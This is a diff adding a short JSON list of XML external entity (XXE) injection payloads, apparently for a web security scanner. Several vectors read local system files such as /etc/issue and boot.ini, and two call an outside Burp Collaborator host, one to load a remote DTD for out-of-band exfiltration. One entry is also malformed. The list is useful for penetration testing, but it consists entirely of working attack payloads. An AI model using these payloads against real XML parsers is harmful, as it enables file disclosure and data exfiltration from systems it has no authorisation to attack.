@@ -1,0 +1,5 @@
+{"vector":"<!DOCTYPE docem [<!ENTITY xxe_canary_0 \"XXE_STRING\">]>","reference":"&xxe_canary_0;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_4 SYSTEM \"file:///c:/boot.ini\">]>","reference":"&xxe_canary_4;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_5 SYSTEM \"file:///etc/issue\">]>","reference":"&xxe_canary_5;"}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY % xxe_canary_6 SYSTEM \"file:///etc/issue\"><!ENTITY % dtd SYSTEM \"6fmvyndjd45a0letj7jj7dzej5pvdk.burpcollaborator.net\">%dtd;%trick;]>  ]>","reference":""}
+{"vector":"<!DOCTYPE docem [<!ELEMENT docem ANY ><!ENTITY xxe_canary_7 SYSTEM \"http://6fmvyndjd45a0letj7jj7dzej5pvdk.burpcollaborator.net\">]>","reference":"&xxe_canary_7;"}
